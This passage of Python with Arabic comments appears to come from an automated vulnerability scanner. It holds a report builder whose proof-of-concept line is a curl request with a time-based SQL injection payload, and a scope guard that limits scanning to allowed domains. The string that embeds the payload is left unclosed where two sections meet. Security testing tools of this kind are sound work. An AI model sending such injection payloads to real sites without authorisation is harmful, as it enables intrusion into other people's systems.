class ProofBuilder:
    def build(self, target, f, evidence, impact):
        return f"""
---
### 🛑 {impact['impact']} تم اكتشاف ثغرة
**الموقع المستهدف:** `{target}`  
**نقطة النهاية:** `{f['url']}`  
**الباراميتر المصاب:** `{f['param']}`  

**دليل الإثبات (PoC):**
```bash
curl "{f['url']}?{f['param']}=1'%20AND%20SLEEP(5)--"
​"""---

### 8. حماية النطاق: `scope.py`
*(ملاحظة: تذكر إضافة المواقع التي تملك تصريحاً لفحصها هنا).*
```python
class ScopeGuard:
    def allowed(self, url):
        # أضف النطاقات المسموح بها هنا
        allowed_domains = ["example.com", "localhost"]
        return any(d in url for d in allowed_domains)
